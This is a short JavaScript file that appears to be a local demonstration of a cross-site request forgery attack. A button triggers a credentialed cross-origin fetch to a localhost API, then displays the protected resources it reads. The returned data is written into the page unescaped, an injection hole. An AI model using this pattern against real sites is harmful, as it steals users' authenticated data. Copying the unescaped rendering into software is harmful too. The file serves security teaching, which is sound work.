csrfAttackButton = document.getElementById('csrfAttackButton');
csrfAttackButton.addEventListener("click", csrfAttackButtonEventHandler);

async function csrfAttackButtonEventHandler(event){
    event.preventDefault();
    protectedResourcesTable = document.getElementById('protectedResourcesTable');
    protectedResourcesTable.innerHTML = '<p>Performing csrf attack</p>';
    protectedResources = await getProtectedResourcesFromOtherSite();
    if(protectedResources === null){
        protectedResourcesTable.innerHTML = '<p>csrf attack failed</p>';
    }else{
        let resourcesTableHtml = `
        <p>csrf attack success</p>
        <table>
            <thead>
                <tr>
                    <th>Name</th>
                    <th>Properties</th>
                </tr>
            </thead>
            <tbody>
        `;
    
        for (const resource of protectedResources) {
            resourcesTableHtml += `
                <tr>
                    <td>${resource.name}</td>
                    <td>${formatProperties(resource.properties)}</td>
                </tr>
            `;
        }
    
        resourcesTableHtml += `
            </tbody>
        </table>
        `;
        protectedResourcesTable.innerHTML = resourcesTableHtml;
    }
}

function formatProperties(properties) {
    if (!properties || typeof properties !== "object") {
      return "";
    }
  
    return Object.entries(properties)
      .map(
        ([key, value]) =>
          `<div><strong>${key}</strong>: ${value}</div>`
      )
      .join("");
  }

async function callOtherSiteProtectedResourceAPI(){
    try{
        const url = "http://localhost:3000/ui/protected/resources";
        return fetch(url, {
          method: "GET",
          credentials: "include"
        });
    }catch(err){
        return null;
    }
}

async function getProtectedResourcesFromOtherSite(){
    const response = await callOtherSiteProtectedResourceAPI();
    if (!response.ok) {
        console.error("Failed to fetch resources");
        return null;
    }
    
    const data = await response.json();
    return data?.items ?? null;
}